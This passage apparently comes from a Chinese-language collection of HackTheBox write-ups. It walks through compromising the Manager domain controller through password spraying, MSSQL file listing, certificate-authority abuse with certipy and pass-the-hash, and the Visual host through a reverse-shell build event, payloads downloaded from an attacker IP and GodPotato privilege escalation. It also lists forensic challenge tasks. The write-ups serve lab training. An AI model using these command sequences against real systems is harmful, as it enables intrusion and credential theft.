STATE    SERVICE       VERSION\n53/tcp    open     domain        Simple DNS Plus\n80/tcp    open     http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Manager\n| http-methods: \n|_  Potentially risky methods: TRACE\n88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-26 07:34:04Z)\n135/tcp   open     msrpc         Microsoft Windows RPC\n139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2023-10-26T07:35:39+00:00; +7h00m00s from scanner time.\n| ssl-cert: Subject: commonName=dc01.manager.htb\n| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.manager.htb\n| Not valid before: 2023-07-30T13:51:28\n|_Not valid after:  2024-07-29T13:51:28\n445/tcp   open     microsoft-ds?\n464/tcp   open     kpasswd5?\n593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.manager.htb\n| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.manager.htb\n| Not valid before: 2023-07-30T13:51:28\n|_Not valid after:  2024-07-29T13:51:28\n|_ssl-date: 2023-10-26T07:35:38+00:00; +7h00m00s from scanner time.\n1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n|_ms-sql-info: ERROR: Script execution failed (use -d to debug)\n|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)\n|_ssl-date: 2023-10-26T07:35:39+00:00; +7h00m00s from scanner time.\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2023-10-25T20:54:34\n|_Not valid after:  2053-10-25T20:54:34\n3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.manager.htb\n| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.manager.htb\n| Not valid before: 2023-07-30T13:51:28\n|_Not valid after:  2024-07-29T13:51:28\n|_ssl-date: 2023-10-26T07:35:39+00:00; +7h00m00s from scanner time.\n3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.manager.htb\n| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.manager.htb\n| Not valid before: 2023-07-30T13:51:28\n|_Not valid after:  2024-07-29T13:51:28\n|_ssl-date: 2023-10-26T07:35:38+00:00; +7h00m00s from scanner time.\n5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open     mc-nmf        .NET Message Framing\n49667/tcp open     msrpc         Microsoft Windows RPC\n49687/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49688/tcp open     msrpc         Microsoft Windows RPC\n49689/tcp open     msrpc         Microsoft Windows RPC\n49726/tcp open     msrpc         Microsoft Windows RPC\n51064/tcp filtered unknown\n61595/tcp open     msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\nNo OS matches for host\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s\n| smb2-security-mode: \n|   311: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2023-10-26T07:34:59\n|_  start_date: N/A\n</code></pre> <ul> <li><code>cme smb 10.10.11.236 -u guest -p '' --shares --rid-brute</code></li> </ul> <pre><code>SMB         dc01.manager.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)\nSMB         dc01.manager.htb 445    DC01             [+] manager.htb\\guest: \nSMB         dc01.manager.htb 445    DC01             [*] Enumerated shares\nSMB         dc01.manager.htb 445    DC01             Share           Permissions     Remark\nSMB         dc01.manager.htb 445    DC01             -----           -----------     ------\nSMB         dc01.manager.htb 445    DC01             ADMIN$                          Remote Admin\nSMB         dc01.manager.htb 445    DC01             C$                              Default share\nSMB         dc01.manager.htb 445    DC01             IPC$            READ            Remote IPC\nSMB         dc01.manager.htb 445    DC01             NETLOGON                        Logon server share \nSMB         dc01.manager.htb 445    DC01             SYSVOL                          Logon server share \nSMB         dc01.manager.htb 445    DC01             498: MANAGER\\Enterprise Read-only Domain Controllers (SidTypeGroup)\nSMB         dc01.manager.htb 445    DC01             500: MANAGER\\Administrator (SidTypeUser)\nSMB         dc01.manager.htb 445    DC01             501: MANAGER\\Guest (SidTypeUser)\nSMB         dc01.manager.htb 445    DC01             502: MANAGER\\krbtgt (SidTypeUser)\nSMB         dc01.manager.htb 445    DC01             512: MANAGER\\Domain Admins (SidTypeGroup)\nSMB         dc01.manager.htb 445    DC01             513: MANAGER\\Domain Users (SidTypeGroup)\nSMB         dc01.manager.htb 445    DC01             514: MANAGER\\Domain Guests (SidTypeGroup)\nSMB         dc01.manager.htb 445    DC01             515: MANAGER\\Domain Computers (SidTypeGroup)\nSMB         dc01.manager.htb 445    DC01             516: MANAGER\\Domain Controllers (SidTypeGroup)\nSMB         dc01.manager.htb 445    DC01             517: MANAGER\\Cert Publishers (SidTypeAlias)\nSMB         dc01.manager.htb 445    DC01             518: MANAGER\\Schema Admins (SidTypeGroup)\nSMB         dc01.manager.htb 445    DC01             519: MANAGER\\Enterprise Admins (SidTypeGroup)\nSMB         dc01.manager.htb 445    DC01             520: MANAGER\\Group Policy Creator Owners (SidTypeGroup)\nSMB         dc01.manager.htb 445    DC01             521: MANAGER\\Read-only Domain Controllers (SidTypeGroup)\nSMB         dc01.manager.htb 445    DC01             522: MANAGER\\Cloneable Domain Controllers (SidTypeGroup)\nSMB         dc01.manager.htb 445    DC01             525: MANAGER\\Protected Users (SidTypeGroup)\nSMB         dc01.manager.htb 445    DC01             526: MANAGER\\Key Admins (SidTypeGroup)\nSMB         dc01.manager.htb 445    DC01             527: MANAGER\\Enterprise Key Admins (SidTypeGroup)\nSMB         dc01.manager.htb 445    DC01             553: MANAGER\\RAS and IAS Servers (SidTypeAlias)\nSMB         dc01.manager.htb 445    DC01             571: MANAGER\\Allowed RODC Password Replication Group (SidTypeAlias)\nSMB         dc01.manager.htb 445    DC01             572: MANAGER\\Denied RODC Password Replication Group (SidTypeAlias)\nSMB         dc01.manager.htb 445    DC01             1000: MANAGER\\DC01$ (SidTypeUser)\nSMB         dc01.manager.htb 445    DC01             1101: MANAGER\\DnsAdmins (SidTypeAlias)\nSMB         dc01.manager.htb 445    DC01             1102: MANAGER\\DnsUpdateProxy (SidTypeGroup)\nSMB         dc01.manager.htb 445    DC01             1103: MANAGER\\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)\nSMB         dc01.manager.htb 445    DC01             1113: MANAGER\\Zhong (SidTypeUser)\nSMB         dc01.manager.htb 445    DC01             1114: MANAGER\\Cheng (SidTypeUser)\nSMB         dc01.manager.htb 445    DC01             1115: MANAGER\\Ryan (SidTypeUser)\nSMB         dc01.manager.htb 445    DC01             1116: MANAGER\\Raven (SidTypeUser)\nSMB         dc01.manager.htb 445    DC01             1117: MANAGER\\JinWoo (SidTypeUser)\nSMB         dc01.manager.htb 445    DC01             1118: MANAGER\\ChinHae (SidTypeUser)\nSMB         dc01.manager.htb 445    DC01             1119: MANAGER\\Operator (SidTypeUser)\n</code></pre> <p>\u53d1\u73b0\u90e8\u5206\u7528\u6237\u540d\uff0c\u8f6c\u5c0f\u5199\u4fdd\u5b58</p> <pre><code>administrator\nguest\nkrbtgt\ndc01$\nzhong\ncheng\nryan\nraven\njinwoo\nchinhae\noperator\n</code></pre>"}, {"location": "HackTheBox/Machines/Manager/#shell-as-mssql", "title": "Shell as mssql", "text": "<p>\u5c1d\u8bd5\u4f7f\u7528\u7528\u6237\u540d\u679a\u4e3e\u5bc6\u7801\uff0c\u56e0\u4e3a nmap \u626b\u5230 mssql \u6240\u4ee5\u4e00\u8d77\u679a\u4e3e\u4e00\u4e0b</p> <ul> <li><code>cme smb 10.10.11.236 -u user.txt -p user.txt --no-brute</code></li> <li><code>cme mssql 10.10.11.236 -u user.txt -p user.txt --no-brute</code></li> </ul> <pre><code>SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.236    445    DC01             [-] manager.htb\\administrator:administrator STATUS_LOGON_FAILURE \nSMB         10.10.11.236    445    DC01             [-] manager.htb\\guest:guest STATUS_LOGON_FAILURE \nSMB         10.10.11.236    445    DC01             [-] manager.htb\\krbtgt:krbtgt STATUS_LOGON_FAILURE \nSMB         10.10.11.236    445    DC01             [-] manager.htb\\dc01$:dc01$ STATUS_LOGON_FAILURE \nSMB         10.10.11.236    445    DC01             [-] manager.htb\\zhong:zhong STATUS_LOGON_FAILURE \nSMB         10.10.11.236    445    DC01             [-] manager.htb\\cheng:cheng STATUS_LOGON_FAILURE \nSMB         10.10.11.236    445    DC01             [-] manager.htb\\ryan:ryan STATUS_LOGON_FAILURE \nSMB         10.10.11.236    445    DC01             [-] manager.htb\\raven:raven STATUS_LOGON_FAILURE \nSMB         10.10.11.236    445    DC01             [-] manager.htb\\jinwoo:jinwoo STATUS_LOGON_FAILURE \nSMB         10.10.11.236    445    DC01             [-] manager.htb\\chinhae:chinhae STATUS_LOGON_FAILURE \nSMB         10.10.11.236    445    DC01             [+] manager.htb\\operator:operator\nMSSQL       10.10.11.236    1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)\nMSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.\nMSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.\nMSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.\nMSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.\nMSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.\nMSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.\nMSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.\nMSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.\nMSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.\nMSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.\nMSSQL       10.10.11.236    1433   DC01             [+] manager.htb\\operator:operator\n</code></pre> <p>\u53d1\u73b0\u4e24\u7ec4\u51ed\u636e</p> <pre><code>SMB://operator:operator\nMSSQL://operator:operator\n</code></pre> <p>SMB \u6ca1\u770b\u5230\u4ec0\u4e48\u4fe1\u606f\uff0c\u8fde\u63a5 MSSQL\uff0cxp_cmdshell \u65e0\u6cd5\u4f7f\u7528\uff0c\u53ef\u4ee5\u7528 xp_dirtree</p> <ul> <li><code>exec xp_dirtree 'c:\\inetpub\\wwwroot\\',1,1</code> \u627e\u5230 Web \u76ee\u5f55\uff0c\u53d1\u73b0 backup</li> </ul> <pre><code>SQL (MANAGER\\Operator  guest@master)&gt; exec xp_dirtree 'c:\\inetpub\\wwwroot\\',1,1\nsubdirectory                      depth   file   \n-------------------------------   -----   ----   \nabout.html                            1      1   \ncontact.html                          1      1   \ncss                                   1      0   \nimages                                1      0   \nindex.html                            1      1   \njs                                    1      0   \nservice.html                          1      1   \nweb.config                            1      1   \nwebsite-backup-27-07-23-old.zip       1      1\n</code></pre>"}, {"location": "HackTheBox/Machines/Manager/#shell-as-maven", "title": "Shell as maven", "text": "<p>Web \u670d\u52a1\u4e0b\u8f7d backup \u53d1\u73b0\u65b0\u51ed\u636e</p> <p></p> <ul> <li><code>evil-winrm -u raven -p 'R4v3nBe5tD3veloP3r!123' -i 10.10.11.236</code></li> </ul> <p></p> <ul> <li><code>certipy find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236</code></li> </ul> <p></p>"}, {"location": "HackTheBox/Machines/Manager/#shell-as-system", "title": "Shell as SYSTEM", "text": "<ol> <li><code>certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'</code></li> </ol> <p>``` Certipy v4.7.0 - by Oliver Lyak (ly4k)</p> <p>[*] Successfully added officer 'Raven' on 'manager-DC01-CA' <pre><code>2. ```\n   certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'\n   ```\n</code></pre> Certipy v4.7.0 - by Oliver Lyak (ly4k)</p> <p>[*] Successfully enabled 'SubCA' on 'manager-DC01-CA' <pre><code>3. ```\n   certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target ca.manager.htb -template SubCA -upn administrator@manager.htb\n   ```\n</code></pre> Certipy v4.7.0 - by Oliver Lyak (ly4k)</p> <p>[] Requesting certificate via RPC [-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate. [] Request ID is 15 Would you like to save the private key? (y/N) y [*] Saved private key to 15.key [-] Failed to request certificate <pre><code>4. ```\n    certipy ca -ca 'manager-DC01-CA' -issue-request 15 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'\n   ```\n</code></pre> Certipy v4.7.0 - by Oliver Lyak (ly4k)</p> <p>[*] Successfully issued certificate <pre><code>5. ```\n   certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target ca.manager.htb -retrieve 15\n   ```\n</code></pre> Certipy v4.7.0 - by Oliver Lyak (ly4k)</p> <p>[] Rerieving certificate with ID 15 [] Successfully retrieved certificate [] Got certificate with UPN 'administrator@manager.htb' [] Certificate has no object SID [] Loaded private key from '15.key' [] Saved certificate and private key to 'administrator.pfx' <pre><code>* \u63d0\u53d6 Hash\n* `sudo ntpdate -s 10.10.11.236`\n* `certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236`\n</code></pre> Certipy v4.7.0 - by Oliver Lyak (ly4k)</p> <p>[] Using principal: administrator@manager.htb [] Trying to get TGT... [] Got TGT [] Saved credential cache to 'administrator.ccache' [] Trying to retrieve NT hash for 'administrator' [] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef <pre><code>* `evil-winrm -u administrator --hash 'ae5064c2f62317332c88629e025924ef' -i 10.10.11.236`\n</code></pre> type c:\\Users\\Administrator\\Desktop\\root.txt ```</p> <p></p>"}, {"location": "HackTheBox/Machines/Visual/", "title": "Visual", "text": ""}, {"location": "HackTheBox/Machines/Visual/#enumeration", "title": "Enumeration", "text": "<pre><code># IP='10.10.11.234'; nmap -sC -sV -O -p$(nmap -sS -p- --min-rate 1000 -T4 $IP | grep '/tcp\\|/udp' | awk -F '/' '{print $1}' | tr '\\n' ',') $IP -oN nmap.txt\n\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-10-25 16:25 CST\nNmap scan report for 10.10.11.234\nHost is up (0.10s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)\n|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17\n|_http-title: Visual - Revolutionizing Visual Studio Builds\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\nNo OS matches for host\n</code></pre> <ul> <li>\u6307\u7eb9\u8bc6\u522b</li> </ul> <pre><code>http://10.10.11.234 [200 OK] Apache[2.4.56], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17], IP[10.10.11.234], OpenSSL[1.1.1t], PHP[8.1.17], Script, Title[Vi\nsual - Revolutionizing Visual Studio Builds], X-Powered-By[PHP/8.1.17]\n</code></pre> <ul> <li>\u8bbf\u95ee Web \u670d\u52a1</li> </ul> <p>\u5b57\u9762\u610f\u601d\uff0c\u53ef\u4ee5\u81ea\u52a8\u7f16\u8bd1 C# \u9879\u76ee</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u662f git \u8bf7\u6c42</p> <p></p> <p>Visual \u5728\u6784\u5efa\u9879\u76ee\u7684\u65f6\u5019\u53ef\u4ee5\u6dfb\u52a0\u4e8b\u4ef6\uff0c\u53ef\u4ee5\u5728\u6784\u5efa\u524d\u540e\u6267\u884c\u547d\u4ee4</p> <p></p> <p></p> <p>\u53bbGithub \u514b\u9686\u4e00\u4e2a\u7b80\u5355\u9879\u76ee\u7f16\u8f91 .csproj \u6587\u4ef6\uff0c\u5199\u5165 reverse shell</p> <p></p> <p>\u9879\u76ee\u6784\u5efa\u8d85\u65f6</p> <p></p> <p>\u4f46\u662f Shell \u5df2\u7ecf\u5f39\u8fc7\u6765\u4e86</p> <p></p> <p></p>"}, {"location": "HackTheBox/Machines/Visual/#shell-as-xampp", "title": "Shell as xampp", "text": "<p>\u53d1\u73b0 xampp\uff0c\u4e00\u822c xampp \u6743\u9650\u5f88\u9ad8\uff0c\u4e0a\u4f20\u4e00\u4e2a php \u8bd5\u8bd5\u6743\u9650</p> <pre><code>wget http://10.10.16.16:81/sdiouqwehrhkjqwe.php -O 1.php\n</code></pre> <p></p> <p>\u4f46\u662f\u5e76\u6ca1\u6709\u5565\u6743\u9650\uff0c\u4e00\u822c xampp \u6743\u9650\u5f88\u9ad8\uff0c\u91cd\u7f6e\u4e00\u4e0b\u8bd5\u8bd5</p> <p>https://github.com/itm4n/FullPowers</p> <pre><code>wget http://10.10.16.16:81/FullPowers.exe -O 1.exe\n</code></pre> <p></p> <p>\u8fd9\u5c31\u5bf9\u4e86 GodPotato \u63d0\u6743</p> <p>https://github.com/BeichenDream/GodPotato</p> <pre><code>wget http://10.10.16.16:81/GodPotato-NET4.exe -O 2.exe\n2.exe -cmd \"cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt\"\n</code></pre> <p></p>"}, {"location": "HackTheBox/Sherlocks/OpTinselTrace-1/", "title": "OpTinselTrace-1", "text": "<p>https://app.hackthebox.com/sherlocks/OpTinselTrace-1</p> <p>An elf named \"Elfin\" has been acting rather suspiciously lately. He's been working at odd hours and seems to be bypassing some of Santa's security protocols. Santa's network of intelligence elves has told Santa that the Grinch got a little bit too tipsy on egg nog and made mention of an insider elf! Santa is very busy with his naughty and nice list, so he\u2019s put you in charge of figuring this one out. Please audit Elfin\u2019s workstation and email communications.</p> <p>\u9644\u4ef6 \u63d0\u53d6\u7801:k7rn </p>"}, {"location": "HackTheBox/Sherlocks/OpTinselTrace-1/#tasks", "title": "Tasks", "text": "<ul> <li> Task 1 - What is the name of the email client that Elfin is using?</li> <li> Task 2 - What is the email the threat is using?</li> <li> Task 3 - When does the threat actor reach out to Elfin?</li> <li> Task 4 - What is the name of Elfins boss?</li> <li> Task 5 - What is the title of the email in which Elfin first mentions his access to Santas special files?</li> <li> Task 6 - The threat actor changes their name, what is the new name + the date of the first email Elfin receives with it?</li> <li> Task 7 - What is the name of the bar that Elfin offers to meet the threat actor at?</li> <li> Task 8 - When does Elfin offer to send the secret files to the actor?</li> <li> Task 9 - What is the search string for the first suspicious google search from Elfin? (Format: string)</li> <li> Task 10 - What is the name of the author who wrote the article from the CIA field manual?</li> <li> Task 11 - What is the name of Santas secret file that Elfin sent to the actor?</li> <li> Task 12 - According to the filesystem, what is the exact CreationTime of the secret file on Elfins host?</li> <li> Task 13 - What is the full directory name that Elfin stored the file in?</li> <li> Task 14  Which country is Elfin trying to flee to after he exfiltrates the file?</li> <li> Task 15 - What is the email address of the apology letter the user (elfin) wrote out but didn\u2019t send?</li> <li> Task 16 - The head elf PixelPeppermint has requested any passwords of Elfins to assist in the investigation down the line. What\u2019s the windows password of Elfin\u2019s host?</li> </ul>"}, {"location": "HackTheBox/Sherlocks/TickTock/", "title": "TickTock", "text": "<p>https://app.hackthebox.com/sherlocks/TickTock</p> <p>Gladys is a new joiner in the company, she has recieved an email informing her that the IT department is due to do some work on her PC, she is guided to call the IT team where they will inform her on how to allow them remote access. The IT team however are actually a group of hackers that are attempting to attack Forela.</p> <p>\u9644\u4ef6 \u63d0\u53d6\u7801:8e68</p>"}, {"location": "HackTheBox/Sherlocks/TickTock/#task", "title": "Task", "text": "<ul> <li> <p> Task 1 - What was the name of the executable that was uploaded as a C2 Agent?</p> </li> <li> <p> Task 2 - What was the session id for in the initial access?</p> </li> <li> <p> Task 3 - The attacker attempted to set a bitlocker password on the C: drive what was the password?</p> </li> <li> <p> Task 4 - What name was used by the attacker?</p> </li> <li> <p> Task 5 - What IP address did the C2 connect back to?</p> </li> <li> <p> Task 6 - What category did Windows Defender give to the C2 binary file?</p> </li> <li> <p> Task 7 - What was the filename of the powershell script the attackers used to manipulate time?</p> </li> <li> <p> Task 8 - What time did the initial access connection start?</p> </li> <li> <p> Task 9 - What is the SHA1 and SHA2 sum of the malicious binary?</p> </li> <li> <p> Task 10 - How many times did the powershell script change the time on the machine?</p> </li> <li> <p> Task 11 - What is the SID of the victim user?</p> </li> </ul>"}, {"location": "HackTheBox/Sherlocks/TickTock/#data", "title": "Data", "text": "<p>\u89e3\u538b\u540e\u5f97\u5230\u4e00\u4e2a\u76ee\u5f55\uff0c\u5185\u6709\u4ee5\u4e0b\u6587\u4ef6  \u4e09\u4e2a\u6587\u672c\u6587\u4ef6\u8bb0\u5f55\u4e86<code>C</code> \u76ee\u5f55\u7684\u7ed3\u6784\u4fe1\u606f\u3002</p>"}, {"location": "HackTheBox/Sherlocks/TickTock/#task-1", "title": "Task 1", "text": "<p>What was the name of the executable that was uploaded as a C2 Agent? merlin.exe</p> <p>\u9996\u5148\u67e5\u770b gladys \u4e3b\u76ee\u5f55\uff0c\u5e76\u6ca1\u6709\u53d1\u73b0\u4ec0\u4e48\u4e1c\u897f </p> <p>\u60f3\u5230\u540e\u95e8\u53ef\u80fd\u4f1a\u88ab Windows defender \u6740\u6389\uff0c\u67e5\u770b WDF \u65e5\u5fd7 </p>"}, {"location": "HackTheBox/Sherlocks/TickTock/#task-2", "title": "Task 2", "text": "<p>What was the session id for in the initial access? -2102926010</p> <p>session id \u76ee\u524d\u6ca1\u6709\u5934\u7eea\uff0c\u4e0d\u77e5\u9053\u662f\u4ec0\u4e48\u8f6f\u4ef6\u7684\uff0c\u4e0d\u8fc7\u65e2\u7136\u662f\u8fde\u63a5\u8fdb\u6765\u7684\u5e94\u8be5\u4f1a\u6709\u65e5\u5fd7\uff0c\u6240\u4ee5\u5148\u7ffb\u4e00\u7ffb gladys \u7684 AppData \u76ee\u5f55   \u53d1\u73b0 TeamViewer\uff0c\u67e5\u770b\u65e5\u5fd7\uff0c\u53d1\u73b0 Session id </p>"}, {"location": "HackTheBox/Sherlocks/TickTock/#task-3", "title": "Task 3", "text": "<p>The attacker attempted to set a bitlocker password on the\u00a0<code>C:</code>\u00a0drive what was the password? a</p> <p>\u653b\u51fb\u8005\u8bd5\u56fe\u8bbe\u7f6e bitlocker</p>"}]}